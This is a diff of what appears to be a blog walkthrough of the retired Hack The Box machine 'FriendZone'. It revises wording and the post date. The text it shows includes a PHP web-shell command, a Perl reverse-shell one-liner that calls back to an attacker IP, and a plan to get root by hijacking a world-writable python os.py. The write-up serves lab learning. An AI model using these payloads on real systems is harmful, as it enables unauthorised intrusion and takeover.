@@ -2,7 +2,7 @@
 layout: post
 title: "FriendZone: Hack The Box Walkthrough"
 date: 2019-07-14 05:07:52 +0000
-last_modified_at: 2019-07-14 05:07:59 +0000
+last_modified_at: 2019-07-14 21:43:33 +0000
 category: Walkthrough
 tags: ["Hack The Box", FriendZone, retired]
 comments: true
@@ -181,7 +181,7 @@ Awesome. Experience tells me I should put those subdomains into `/etc/hosts`.
 # echo -e "10.10.10.123\t$(host -l friendzoneportal.red 10.10.10.123 | grep "has address" | cut -d' ' -f1 | tr '\n' ' ')" >> /etc/hosts
 ```
 
-But, wait. There is another zone—`friendzone.red` exposed by the `ssl/http` service, discovered in our `nmap` scan.
+But, wait. There\'s another zone—`friendzone.red` exposed by the `ssl/http` service, discovered in our `nmap` scan.
 
 <a class="image-popup">
 ![569e34c9.png](/assets/images/posts/friendzone-htb-walkthrough/569e34c9.png)
@@ -261,7 +261,7 @@ See? You are never going to upload anything.
 ?>
 ```
 
-Recall that I was able to write to `Directory`. Let's write a small PHP file to prove that we are able to run PHP code.
+Recall that I was able to write to `Directory`? Let\'s write a small PHP file to prove that we are able to run PHP code.
 
 <div class="filename"><span>info.php</span></div>
 
@@ -269,18 +269,18 @@ Recall that I was able to write to `Directory`. Let's write a small PHP file to 
 # echo "<?php phpinfo(); ?>" > info.php
 ```
 
-In the shares comment, `Files` is said to be mapped to `/etc/Files`. By extension, `Development` is mapped to `/etc/Development`.
+In the shares comment, `Files` was shown to be mapped to `/etc/Files`. By extension, `Development` should be mapped to `/etc/Development`.
 
 <a class="image-popup">
 ![dfab6015.png](/assets/images/posts/friendzone-htb-walkthrough/dfab6015.png)
 </a>
 
-Awesome. Now, let's step up the game and write another small PHP file, that allows us to execute remote commands.
+Awesome. Now, let\'s step up the game and write another small PHP file, that allows us to execute remote commands.
 
 <div class="filename"><span>cmd.php</span></div>
 
 ```
-# echo ''<?php echo shell_exec($_GET[0]); ?>'' > cmd.php
+# echo '<?php echo shell_exec($_GET[0]); ?>' > cmd.php
 ```
 
 <a class="image-popup">
@@ -291,13 +291,13 @@ Sweet. Time to get ourselves a Perl reverse shell.
 
 ## Low-Privilege Shell
 
-Here's the Perl one-liner I use.
+Here\'s the Perl one-liner I use.
 
 ```
 perl -e 'use Socket;$i="10.10.12.246";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
 ```
 
-Of course, it's best to urlencode it to prevent complications in the browser's address bar.
+Of course, it\'s best to `urlencode` it to prevent complications in the browser's address bar.
 
 <a class="image-popup">
 ![14648ca0.png](/assets/images/posts/friendzone-htb-walkthrough/14648ca0.png)
@@ -321,16 +321,16 @@ The file `user.txt` is at `friend`'s home directory.
 ![38a7e04a.png](/assets/images/posts/friendzone-htb-walkthrough/38a7e04a.png)
 </a>
 
-Moving on, I noticed two pieces of interesting information:
+Moving on, I noticed two interesting pieces of information:
 
 + `/usr/lib/python2.7/os.py` is world-writable
 + `/opt/server-admin/report.py` imports the `os` module
 
-I think I know where this is going: privilege escalation via python library hiacking. If I had to guess, I would say there's a `cron` job running as `root` that executes `/opt/server-admin/reporter.py`.
+I think I know where this is going: privilege escalation via python library hijacking. If I had to guess, I would say there's a `cron` job running as `root` that executes `/opt/server-admin/reporter.py`.
 
 Here's the game plan.
 
-First, I log it to `friend` via SSH. This is easy since I already have `friend`'s password. Then I `scp` a `os.py` over to the box with the following code appended.
+First, I log it to `friend` via SSH. This is easy since I already have `friend`'s password. Then I `scp` a copy of `os.py` over to the box with the following code appended.
 
 ```
 import os, socket, pty
